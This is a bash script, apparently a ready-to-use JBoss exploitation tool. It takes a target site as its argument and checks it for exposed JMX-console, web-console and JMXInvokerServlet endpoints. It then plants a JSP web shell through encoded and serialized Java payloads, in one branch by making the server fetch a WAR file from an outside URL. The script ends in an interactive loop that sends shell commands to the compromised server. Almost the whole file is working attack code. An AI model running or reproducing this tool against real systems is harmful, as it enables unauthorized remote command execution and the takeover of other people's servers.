#!/bin/bash
# @autor: Henrique Bissoli Silva (emp.shad@gmail.com)
# Updates: https://github.com/Shadowz3n/JBoss-Vuln

RED=`tput setaf 1`
GREEN=`tput setaf 2`
NC=`tput sgr0`
CHECKVULN="${RED}CHECKING CONNECTION..${NC}"
OWNEDTEXT="${RED}[OWNED] STARTING COMMAND SHELL..${NC} Type commands or 'exit' to finish"
UPLOADTEXT="${RED}UPLOADING EXPLOIT..${NC}"
NOT_VULTEXT="${GREEN}[NOT VULNERABLE]${NC}"
OFF_TEXT="${RED}[SERVER OFFLINE]${NC}"
URL=$1

exiting(){
	tput clear
	rm -f /tmp/tempfile
	echo "${GREEN}Exiting..${NC}"
	exit 1
}
control_c(){
	exiting
}
trap control_c SIGINT # Ctrl+C
shell(){
	if [[ $1 = '0' || $1 = '1' ]]; then
		URL_="$URL/jbossass/jbossass.jsp?ppp="
	else
		URL_="$URL/shellinvoker/shellinvoker.jsp?ppp="
	fi
	echo -e ${CHECKVULN}
	CHECKVULN_=`curl -s -o "/dev/null" -w "%{http_code}" -H "User-Agent: jexboss" ${URL_}whoami`
	if [[ $CHECKVULN_ != '404' ]]; then
		echo -e ${OWNEDTEXT}
		while true; do
			echo -ne "\nshell> "
			read
			if [[ $REPLY != '' ]]; then
				if [[ $REPLY = 'exit' ]]; then
					exiting
				else
					tput clear
					if [[ $1 = '0' || $1 = '1' ]]; then
						curl -H "User-Agent: jexboss" ${URL_}$REPLY
					else
						curl -H "User-Agent: jexboss" ${URL_}$REPLY
					fi
				fi
			fi
		done
	else
		echo -e ${NOT_VULTEXT}
	fi
}

exploit(){
	tput clear
	if [[ $1 = 0 ]]; then

		# /jmx-console/HtmlAdaptor jboss4, 5
		echo "${RED}[VULNERABLE] TYPE: JMX-CONSOLE${NC}"
		RAJADAO=`curl -s -o "/dev/null" -w "%{http_code}" -X HEAD $URL"/jbossass/jbossass.jsp" -d "/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=jbossass.war&argType=java.lang.String&arg1=jbossass&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61%2E%75%74%69%6C%2E%2A%2C%6A%61%76%61%2E%69%6F%2E%2A%22%25%3E%3C%70%72%65%3E%3C%25%20%69%66%20%28%72%65%71%75%65%73%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%20%21%3D%20%6E%75%6C%6C%20%26%26%20%72%65%71%75%65%73%74%2E%67%65%74%48%65%61%64%65%72%28%22%75%73%65%72%2D%61%67%65%6E%74%22%29%2E%65%71%75%61%6C%73%28%22%6A%65%78%62%6F%73%73%22%29%29%20%7B%20%50%72%6F%63%65%73%73%20%70%20%3D%20%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%72%65%71%75%65%73%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%29%3B%20%44%61%74%61%49%6E%70%75%74%53%74%72%65%61%6D%20%64%69%73%20%3D%20%6E%65%77%20%44%61%74%61%49%6E%70%75%74%53%74%72%65%61%6D%28%70%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29%29%3B%20%53%74%72%69%6E%67%20%64%69%73%72%20%3D%20%64%69%73%2E%72%65%61%64%4C%69%6E%65%28%29%3B%20%77%68%69%6C%65%20%28%20%64%69%73%72%20%21%3D%20%6E%75%6C%6C%20%29%20%7B%20%6F%75%74%2E%70%72%69%6E%74%6C%6E%28%64%69%73%72%29%3B%20%64%69%73%72%20%3D%20%64%69%73%2E%72%65%61%64%4C%69%6E%65%28%29%3B%20%7D%20%7D%25%3E&argType=boolean&arg4=True"`
		if [[ $RAJADAO = '200' || $RAJADAO = '500' ]]; then
			shell $1
		else
			
			# jboss4
			echo -e $UPLOADTEXT
			$RAJADAO_UPLOAD=`curl -s -o "/dev/null" -w "%{http_code}" $URL"/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=19&arg0=https://github.com/Shadowz3n/JBoss-Vuln/raw/master/jbossass.war"`
			if [[ $RAJADAO_UPLOAD = '200' || $RAJADAO_UPLOAD = '500' ]]; then
				shell $1
			else
				echo -e ${NOT_VULTEXT}
			fi
		fi
	elif [[ $1 = 1 ]]; then
	
		# /web-console/Invoker jboss5
		echo "${RED}[VULNERABLE] TYPE: WEB-CONSOLE${NC}"
		RAJADAO=`curl -s -o "/dev/null" -H "Content-Type: application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation" -H "Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2" -w "%{http_code}" $URL"/web-console/Invoker" -d "\xac\xed\x00\x05\x73\x72\x00\x2e\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x72\x65\x6d\x6f\x74\x65\x2e\x52\x65\x6d\x6f\x74\x65\x4d\x42\x65\x61\x6e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\xe0\x4f\xa3\x7a\x74\xae\x8d\xfa\x02\x00\x04\x4c\x00\x0a\x61\x63\x74\x69\x6f\x6e\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x06\x70\x61\x72\x61\x6d\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x5b\x00\x09\x73\x69\x67\x6e\x61\x74\x75\x72\x65\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x10\x74\x61\x72\x67\x65\x74\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x74\x00\x1d\x4c\x6a\x61\x76\x61\x78\x2f\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2f\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x3b\x78\x70\x74\x00\x06\x64\x65\x70\x6c\x6f\x79\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00\x2a\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x6a\x6f\x61\x6f\x6d\x61\x74\x6f\x73\x66\x2e\x63\x6f\x6d\x2f\x72\x6e\x70\x2f\x6a\x62\x6f\x73\x73\x61\x73\x73\x2e\x77\x61\x72\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x73\x72\x00\x1b\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x0f\x03\xa7\x1b\xeb\x6d\x15\xcf\x03\x00\x00\x78\x70\x74\x00\x21\x6a\x62\x6f\x73\x73\x2e\x73\x79\x73\x74\x65\x6d\x3a\x73\x65\x72\x76\x69\x63\x65\x3d\x4d\x61\x69\x6e\x44\x65\x70\x6c\x6f\x79\x65\x72\x78"`
		if [[ $RAJADAO = '200' || $RAJADAO = '500' ]]; then
			shell $1
		else
			echo -e ${NOT_VULTEXT}
		fi
	elif [[ $1 = 2 ]]; then
	
		# /invoker/JMXInvokerServlet jboss4, 5
		echo "${RED}[VULNERABLE] TYPE: INVOKER${NC}"
		RAJADAO=`curl -s -o "/dev/null" -w "%{http_code}" $URL"/invoker/JMXInvokerServlet" -d "\xac\xed\x00\x05\x73\x72\x00\x29\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d\x61\x72\x73\x68\x61\x6c\x6c\x65\x64\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\xf6\x06\x95\x27\x41\x3e\xa4\xbe\x0c\x00\x00\x78\x70\x70\x77\x08\x78\x94\x98\x47\xc1\xd0\x53\x87\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x78\x70\xe3\x2c\x60\xe6\x73\x72\x00\x24\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d\x61\x72\x73\x68\x61\x6c\x6c\x65\x64\x56\x61\x6c\x75\x65\xea\xcc\xe0\xd1\xf4\x4a\xd0\x99\x0c\x00\x00\x78\x70\x7a\x00\x00\x02\xc6\x00\x00\x02\xbe\xac\xed\x00\x05\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x04\x73\x72\x00\x1b\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x0f\x03\xa7\x1b\xeb\x6d\x15\xcf\x03\x00\x00\x78\x70\x74\x00\x2c\x6a\x62\x6f\x73\x73\x2e\x61\x64\x6d\x69\x6e\x3a\x73\x65\x72\x76\x69\x63\x65\x3d\x44\x65\x70\x6c\x6f\x79\x6d\x65\x6e\x74\x46\x69\x6c\x65\x52\x65\x70\x6f\x73\x69\x74\x6f\x72\x79\x78\x74\x00\x05\x73\x74\x6f\x72\x65\x75\x71\x00\x7e\x00\x00\x00\x00\x00\x05\x74\x00\x10\x73\x68\x65\x6c\x6c\x69\x6e\x76\x6f\x6b\x65\x72\x2e\x77\x61\x72\x74\x00\x0c\x73\x68\x65\x6c\x6c\x69\x6e\x76\x6f\x6b\x65\x72\x74\x00\x04\x2e\x6a\x73\x70\x74\x01\x79\x3c\x25\x40\x20\x70\x61\x67\x65\x20\x69\x6d\x70\x6f\x72\x74\x3d\x22\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x2a\x2c\x6a\x61\x76\x61\x2e\x69\x6f\x2e\x2a\x22\x25\x3e\x3c\x70\x72\x65\x3e\x3c\x25\x69\x66\x28\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x50\x61\x72\x61\x6d\x65\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29\x20\x21\x3d\x20\x6e\x75\x6c\x6c\x20\x26\x26\x20\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x48\x65\x61\x64\x65\x72\x28\x22\x75\x73\x65\x72\x2d\x61\x67\x65\x6e\x74\x22\x29\x2e\x65\x71\x75\x61\x6c\x73\x28\x22\x6a\x65\x78\x62\x6f\x73\x73\x22\x29\x20\x29\x20\x7b\x20\x50\x72\x6f\x63\x65\x73\x73\x20\x70\x20\x3d\x20\x52\x75\x6e\x74\x69\x6d\x65\x2e\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x28\x29\x2e\x65\x78\x65\x63\x28\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x50\x61\x72\x61\x6d\x65\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29\x29\x3b\x20\x44\x61\x74\x61\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x20\x64\x69\x73\x20\x3d\x20\x6e\x65\x77\x20\x44\x61\x74\x61\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x28\x70\x2e\x67\x65\x74\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x28\x29\x29\x3b\x20\x53\x74\x72\x69\x6e\x67\x20\x64\x69\x73\x72\x20\x3d\x20\x64\x69\x73\x2e\x72\x65\x61\x64\x4c\x69\x6e\x65\x28\x29\x3b\x20\x77\x68\x69\x6c\x65\x20\x28\x20\x64\x69\x73\x72\x20\x21\x3d\x20\x6e\x75\x6c\x6c\x20\x29\x20\x7b\x20\x6f\x75\x74\x2e\x70\x72\x69\x6e\x74\x6c\x6e\x28\x64\x69\x73\x72\x29\x3b\x20\x64\x69\x73\x72\x20\x3d\x20\x64\x69\x73\x2e\x72\x65\x61\x64\x4c\x69\x6e\x65\x28\x29\x3b\x20\x7d\x20\x7d\x25\x3e\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x42\x6f\x6f\x6c\x65\x61\x6e\xcd\x20\x72\x80\xd5\x9c\xfa\xee\x02\x00\x01\x5a\x00\x05\x76\x61\x6c\x75\x65\x78\x70\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x00\x00\x00\x05\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x71\x00\x7e\x00\x0f\x71\x00\x7e\x00\x0f\x71\x00\x7e\x00\x0f\x74\x00\x07\x62\x6f\x6f\x6c\x65\x61\x6e\x63\x79\xb8\x87\x78\x77\x08\x00\x00\x00\x00\x00\x00\x00\x01\x73\x72\x00\x22\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x4b\x65\x79\xb8\xfb\x72\x84\xd7\x93\x85\xf9\x02\x00\x01\x49\x00\x07\x6f\x72\x64\x69\x6e\x61\x6c\x78\x70\x00\x00\x00\x04\x70\x78"`
		if [[ $RAJADAO = '200' || $RAJADAO = '500' ]]; then
			shell $1
		else
			echo -e ${NOT_VULTEXT}
		fi
	fi
	exit 1
}
if [ "$1" ]; then
	echo "${GREEN}Loading..${NC}"
	VULNLINKS=("/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo" "/web-console/ServerInfo.jsp" "/invoker/JMXInvokerServlet")
	VULNCHECK[0]=`curl -s -o "/dev/null" -w "%{http_code}" "$URL${VULNLINKS[0]}"`
	VULNCHECK[1]=`curl -s -o "/dev/null" -w "%{http_code}" "$URL${VULNLINKS[1]}"`
	VULNCHECK[2]=`curl -s -o "/dev/null" -w "%{http_code}" "$URL${VULNLINKS[2]}"`
	if [[ ${VULNCHECK[@]} =~ "200" || ${VULNCHECK[@]} =~ "500" ]]; then
		for element in $(seq 0 $((${#VULNCHECK[@]} - 1))); do
			if [[ ${VULNCHECK[$element]} = '200' || ${VULNCHECK[$element]} = '500' ]]; then
				exploit $element
			fi
		done
	else
		if [[ ${VULNCHECK[@]} =~ "000" ]]; then
			echo -e $OFF_TEXT
		else
			echo -e $NOT_VULTEXT
		fi
	fi
	exit 1
else
	echo "Usage: ./jboss.sh site.com.br"
fi
wait
